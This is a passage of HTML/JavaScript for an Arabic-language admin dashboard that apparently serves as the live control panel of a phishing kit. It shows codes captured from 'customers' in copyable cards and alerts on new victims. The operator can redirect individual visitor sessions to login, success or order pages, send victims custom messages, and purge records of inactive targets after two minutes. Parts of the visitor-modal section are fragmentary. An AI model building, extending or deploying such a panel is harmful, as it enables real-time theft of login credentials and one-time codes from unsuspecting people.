    {l:'→ نجاح ✅',pg:'success.html',c:'#16a34a'},
    {l:'→ الرئيسية',pg:'index.html',c:'#6b7280'},
    {l:'→ صفحة الطلب',pg:'order.html',c:'#0ea5e9'}
  ];
  h+=`<div class="redir-grid">${pages.map(p=>
    `<button style="background:${p.c}" onclick="doRedir(${o.id},'${p.pg}')">${p.l}</button>`
  ).join('')}</div></div>`;

  // CUSTOM MESSAGE
  h+=`<div class="sec-msg"><h4>💬 رسالة مخصصة</h4>
    <textarea id="msgArea" placeholder="اكتب رسالة تظهر للعميل..." rows="2"></textarea>
    <button onclick="sendMsg(${o.id})">إرسال</button></div>`;

  // DELETE SECTION
  h+=`<div class="sec-del"><h4>🗑️ حذف البيانات</h4>
    <div class="del-msg" id="delMsg"></div>
    <div id="delContent">
      <button class="btn-del-all" onclick="showDelConfirm()">🗑️ حذف جميع العملاء غير النشطين (${orders.length-active.length})</button>
    </div>
    <p class="note">سيتم حذف بيانات العملاء الذين لم يتفاعلوا خلال آخر دقيقتين</p></div>`;

  dc.innerHTML=h;
}

function codeCard(lbl,val){
  if(!val)return `<div class="code-empty"><div class="lbl">${lbl}</div><div class="val">لم يُسجل بعد</div></div>`;
  return `<div class="code-card"><div class="lbl">${lbl}</div><div class="val">${esc(val)}</div>
    <button class="cp" onclick="doCopy(this,'${esc(val)}')">📋 نسخ</button></div>`;
}

function doCopy(btn,txt){navigator.clipboard.writeText(txt).then(()=>{
  btn.classList.add('ok');const old=btn.textContent;btn.textContent='✅ تم';
  setTimeout(()=>{btn.classList.remove('ok');btn.textContent=old;},1500);});}

function detDel(id){if(detDelConf){api('DELETE','/api/orders/'+id).then(()=>{detDelConf=false;closeDetail();loadOrders();});}
  else{detDelConf=true;const o=orders.find(x=>x.id===id);if(o)renderDetail(o);
    setTimeout(()=>{if(detDelConf){detDelConf=false;const o2=orders.find(x=>x.id===id);if(o2)renderDetail(o2);}},3000);}}

function showDelConfirm(){
  document.getElementById('delContent').innerHTML=`
    <p class="del-warn">⚠️ هل أنت متأكد؟ سيتم حذف بيانات جميع العملاء غير النشطين نهائياً!</p>
    <div class="del-confirm-row">
      <button style="background:#dc2626;color:#fff" onclick="doDelInactive()">✅ نعم، احذف</button>
      <button style="background:rgba(255,255,255,.1);color:#fff;border:1px solid rgba(255,255,255,.2)" onclick="cancelDelInactive()">❌ إلغاء</button>
    </div>`;
}
async function doDelInactive(){
  const btn=document.querySelector('.del-confirm-row button');
  if(btn){btn.textContent='⏳ جاري الحذف...';btn.disabled=true;}
  const r=await api('DELETE','/api/admin/inactive-clients');
  const msg=document.getElementById('delMsg');
  if(r.success){msg.className='del-msg ok';msg.textContent=`✅ تم حذف ${r.deletedCount} عميل غير نشط بنجاح`;msg.style.display='block';}
  else{msg.className='del-msg err';msg.textContent='❌ فشل الحذف، حاول مرة أخرى';msg.style.display='block';}
  loadOrders();
}
function cancelDelInactive(){const o=orders.find(x=>x.id===selId);if(o)renderDetail(o);}

// ACTIONS
async function doStatus(id,st){await api('PATCH','/api/orders/'+id,{status:st});loadOrders();}
async function doRedir(id,page){const url=page+'?order='+id;
  await api('POST','/api/admin/redirect',{order_id:id,redirect_to:url});showNotif('✅ تم توجيه العميل');loadOrders();}
async function sendMsg(id){const msg=document.getElementById('msgArea').value.trim();if(!msg)return;
  await api('PATCH','/api/orders/'+id,{custom_message:msg});document.getElementById('msgArea').value='';showNotif('✅ تم إرسال الرسالة');}

// LOAD
async function loadOrders(){
  const r=await api('GET','/api/orders');const nw=r.orders||[];
  const nids=new Set(nw.map(o=>o.id));
  if(prevIds.size>0){const fresh=nw.filter(o=>!prevIds.has(o.id));if(fresh.length){playSound();showNotif('🔔 عميل جديد: '+fresh[0].name);}}
  prevIds=nids;orders=nw;renderStats();renderActive();renderOrders();
  if(selId){const o=orders.find(x=>x.id===selId);if(o)renderDetail(o);else closeDetail();}
}
async function loadVisitors(){if(!TOKEN)return;
  const [r1,r2]=await Promise.all([api('GET','/api/visitors/active'),api('GET','/api/visitors/all')]);
  visitors=r1.visitors||[];allVisitors=r2.visitors||[];renderStats();}

// VISITOR MODAL

        <div class="n" style="color:#22c55e;display:flex;align-items:center;justify-content:center;gap:6px">

      <div class="vm-sc" style="background:rgba(59,130,246,.1);border:1px solid rgba(59,130,246,.25)">

    }else{
      h+=`<div style="border:1px solid rgba(255,255,255,.08);border-radius:12px;overflow:hidden"><table class="vm-table"><thead><tr>
        <th>#</th><th>معرف الجلسة</th><th>الحالة</th><th>الصفحة الحالية</th><th>آخر نشاط</th><th style="text-align:center">توجيه الزائر</th></tr></thead><tbody>`;

          <td style="color:rgba(255,255,255,.6)">${fmtDate(v.last_active_at||v.created_at)}</td>
          <td style="text-align:center"><div class="redir-btns">
            <button style="background:rgba(27,122,61,.2);border-color:rgba(27,122,61,.4);color:#86efac" onclick="vmRedir('${esc(v.session_id)}','login.html')">تسجيل الدخول</button>
            <button style="background:rgba(59,130,246,.2);border-color:rgba(59,130,246,.4);color:#93c5fd" onclick="vmRedir('${esc(v.session_id)}','index.html')">الرئيسية</button>
          </div></td></tr>`;
      });
      h+=`</tbody></table></div>`;
    }

    // Footer
    h+=`<div class="vm-footer"><span class="note">يتم احتساب إجمالي الزوار التراكمي تلقائياً عند أول زيارة لكل جلسة فريدة.</span>
      <button style="background:rgba(239,68,68,.12);border:1px solid rgba(239,68,68,.3);color:#f87171;border-radius:8px;padding:6px 14px;font-size:11px;font-weight:700;cursor:pointer;font-family:'Cairo',sans-serif" onclick="resetVisitors()">⚠️ تصفير عداد الزوار</button></div>`;

    h+=`</div></div>`; // modal-body + modal
    document.getElementById('vModal').innerHTML=h;
    document.getElementById('vModal').classList.add('show');

    window.vmSetFilter=function(f){vmFilter=f;render();};
    window.vmSetSearch=function(s){vmSearch=s;render();};
  }
  render();
}
function closeVM(){document.getElementById('vModal').classList.remove('show');document.getElementById('vModal').innerHTML='';}
async function vmRedir(sid,page){
  await api('POST','/api/admin/redirect-visitor',{session_id:sid,page:page});
  const msg=document.getElementById('vmMsg');
  if(msg){msg.style.display='block';msg.textContent=`✅ تم توجيه الزائر (${sid.slice(0,8)}) إلى ${PL[page.replace('.html','')]||page}`;}
  setTimeout(()=>{if(msg)msg.style.display='none';},3000);
}
async function resetVisitors(){
  if(!confirm('هل أنت متأكد من تصفير عداد الزوار؟'))return;
  await api('POST','/api/admin/reset-visitors');await loadVisitors();showNotif('✅ تم تصفير العداد');closeVM();
}

checkAuth();
setInterval(()=>{if(TOKEN){loadOrders();loadVisitors();}},3000);
</script>
</body>
</html>
